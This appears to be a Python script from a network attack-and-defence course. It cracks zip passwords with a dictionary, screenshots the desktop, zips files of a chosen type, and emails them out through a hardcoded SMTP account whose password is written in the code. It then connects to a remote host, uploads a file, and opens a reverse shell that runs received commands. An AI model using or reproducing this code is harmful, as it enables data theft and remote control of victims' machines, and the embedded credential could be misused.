import socket, subprocess
from socket import *
import optparse
import os
import re
import zipfile
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
import platform
from PIL import ImageGrab
from threading import Thread
import json
import struct

def shot():
    pic = ImageGrab.grab()
    pic.save('1.png')

def extractFile(zFile, password):
    try:
        zFile.extractall(pwd=password.encode('ascii'))
        print("[+] Found password " + password + "\n")
    except:
        pass

def findFile(path, postfix = 'jpg', move_to=None):
    os.chdir(path)
    ListFile = os.listdir('.')
    print(path)
    List=[]
    for filename in ListFile:
        fileRegex = re.match(r'.*?\.' + postfix, filename)
        if fileRegex:
            List.append(filename)
    if os.path.exists(move_to) and List:
        newZip=zipfile.ZipFile(move_to+'new.zip','w')
        for x in range(len(List)):
           newZip.write(List[x],compress_type=zipfile.ZIP_DEFLATED)
    else:
        return '文件路径不存在'
    return  List

def send():
    fromaddr = 'zcd1148241614@163.com'
    password = 'hbaysqlwjlgdhhdf'
    toaddrs = ['1148241614@qq.com', 'zcd1148241614@163.com']

    result = platform.platform()
    content = result.read()
    textApart = MIMEText(content)
    # print(content)
    zipFile = 'zipnew.zip'
    zipApart = MIMEApplication(open(zipFile, 'rb').read())
    zipApart.add_header('Content-Disposition', 'attachment', filename=zipFile)

    imageFile = '1.png'
    imageApart = MIMEImage(open(imageFile, 'rb').read(), imageFile.split('.')[-1])
    imageApart.add_header('Content-Disposition', 'attachment', filename=imageFile)

    m = MIMEMultipart()
    m.attach(textApart)
    m.attach(zipApart)
    m.attach(imageApart)
    m['Subject'] = 'title'

    try:
        server = smtplib.SMTP('smtp.163.com')
        server.login(fromaddr, password)
        server.sendmail(fromaddr, toaddrs, m.as_string())
        print('success')
        server.quit()
    except smtplib.SMTPException as e:
        print('error:', e)  # 打印错误

def client():
    host = '192.168.254.129'
    port = 11444
    buffer = 1024

    s = socket(AF_INET, SOCK_STREAM)
    s.connect((host, port))
    s.send('[*] Connection Established!'.encode())

    head = {'filepath': r'C:/Users/YYQ/Desktop',
            'filename': r'C:/Users/YYQ/Desktop/新建文件夹/1.txt',
            'filesize': None}
    file_path = os.path.join(head['filepath'], head['filename'])
    # 计算文件的大小
    filesize = os.path.getsize(os.path.join(head['filepath'], head['filename']))
    head['filesize'] = filesize
    json_head = json.dumps(head)  # 利用json将字典转成字符串
    bytes_head = json_head.encode('utf-8')  # 字符串转bytes
    # 计算head长度
    head_len = len(bytes_head)  # 报头的长度
    # 利用struct将int类型的数据打包成4个字节的byte，所以服务器端接受这个长度的时候可以固定缓冲区大小为4
    pack_len = struct.pack('i', head_len)
    # 先将报头长度发出去
    s.send(pack_len)
    # 再发送bytes类型的报头
    s.send(bytes_head)
    with open(file_path, 'rb') as f:
        while filesize:
            print(filesize)
            if filesize >= buffer:
                content = f.read(buffer)  # 每次读取buffer字节大小内容
                filesize -= buffer
                s.send(content)  # 发送读取的内容
            else:
                content = f.read(filesize)
                s.send(content)
                filesize = 0
                break

    while 1:
        data = s.recv(1024).decode()
        if data == "quit": break
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        # stdout_value = stdout_value.encode('utf-8')
        s.send(stdout_value)
    s.close()


if __name__ == "__main__":
    parser = optparse.OptionParser("usage%prog " + "-t <type> -f <zipfile> -d <dictionary>")
    parser.add_option("-f", dest="zname", type="string", help="specify zip file")
    parser.add_option("-d", dest="dname", type="string", help="specify dictionary file")
    parser.add_option("-t", dest="type", type="string", help="type of file")
    (options, args) = parser.parse_args()
    type = options.type
    zname = options.zname
    dname = options.dname
    zFile = zipfile.ZipFile(zname)
    passFile = open(dname)
    for line in passFile.readlines():
        password = line.strip('\n')
        t = Thread(target=extractFile,args=(zFile, password))
        t.start()
    shot()
    findFile('Z:\网络攻防\王教员',str(type),move_to='Z:\网络攻防\于晗\第二天\zip')
    send()
    client()
